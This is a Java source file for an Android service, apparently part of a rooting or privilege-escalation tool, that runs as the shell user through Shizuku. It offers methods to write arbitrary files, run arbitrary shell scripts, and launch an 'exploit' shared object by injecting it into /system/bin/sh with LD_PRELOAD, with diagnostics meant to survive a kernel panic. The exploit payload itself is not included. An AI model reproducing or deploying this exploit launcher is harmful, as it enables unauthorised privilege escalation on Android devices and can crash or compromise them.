package dev.ghostlock.mepan00;

import android.os.RemoteException;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.Map;
import java.util.concurrent.TimeUnit;

/**
 * Runs as the shell user, in a process Shizuku spawns.
 *
 * This is the only place that touches privileged paths. Two methods matter:
 * startFire() launches the exploit detached (its host process never exits, so
 * blocking here would hang the binder), and readText() lets the app poll the
 * fsync'd diagnostic that survives a panic.
 *
 * Constructors: a no-arg one is required; the Context one is what Shizuku API
 * v13 prefers and is optional.
 */
public class GhostLockService extends IGhostLock.Stub {

    private static final String TAG = "GhostLock";
    private static final String FIRE_TAG = "GL_FIRE_DONE";

    public GhostLockService() {
        Log.i(TAG, "service constructed");
    }

    public GhostLockService(android.content.Context context) {
        Log.i(TAG, "service constructed with context");
    }

    @Override
    public void destroy() {
        System.exit(0);
    }

    @Override
    public void exit() {
        destroy();
    }

    @Override
    public boolean pushFile(String path, byte[] data) throws RemoteException {
        try (FileOutputStream out = new FileOutputStream(path)) {
            out.write(data);
            out.flush();
            out.getFD().sync();
        } catch (IOException e) {
            Log.w(TAG, "pushFile " + path + ": " + e);
            return false;
        }
        new File(path).setReadable(true, false);
        return true;
    }

    @Override
    public String runShell(String script, int timeoutSec) throws RemoteException {
        try {
            Process p = new ProcessBuilder("/system/bin/sh", "-c", script)
                    .redirectErrorStream(true)
                    .start();
            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), StandardCharsets.UTF_8))) {
                String l;
                while ((l = r.readLine()) != null) sb.append(l).append('\n');
            }
            p.waitFor(timeoutSec, TimeUnit.SECONDS);
            return sb.toString();
        } catch (IOException | InterruptedException e) {
            return null;
        }
    }

    @Override
    public boolean startFire(String soPath, String diagPath, String outPath, String[] env)
            throws RemoteException {
        // The exploit is a shared object whose constructor does the work, so it
        // is injected into /system/bin/sh with LD_PRELOAD. It is launched with
        // its output redirected and NOT waited on: the host process keeps threads
        // alive and would never return.
        try {
            File out = new File(outPath);
            ProcessBuilder pb = new ProcessBuilder(
                    "/system/bin/sh", "-c", "echo " + FIRE_TAG);
            Map<String, String> e = pb.environment();
            if (env != null) {
                for (String kv : env) {
                    int eq = kv.indexOf('=');
                    if (eq > 0) e.put(kv.substring(0, eq), kv.substring(eq + 1));
                }
            }
            e.put("SLIDE_DIAG_PATH", diagPath);
            e.put("LD_PRELOAD", soPath);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.to(out));
            pb.start();
            return true;
        } catch (IOException ex) {
            Log.w(TAG, "startFire: " + ex);
            return false;
        }
    }

    @Override
    public String readText(String path) throws RemoteException {
        File f = new File(path);
        if (!f.isFile()) return null;
        try (InputStream in = Files.newInputStream(f.toPath())) {
            byte[] buf = new byte[(int) Math.min(f.length(), 512 * 1024)];
            int off = 0;
            while (off < buf.length) {
                int n = in.read(buf, off, buf.length - off);
                if (n < 0) break;
                off += n;
            }
            return new String(buf, 0, off, StandardCharsets.UTF_8);
        } catch (IOException e) {
            return null;
        }
    }

    @Override
    public boolean exists(String path) {
        return new File(path).isFile();
    }
}
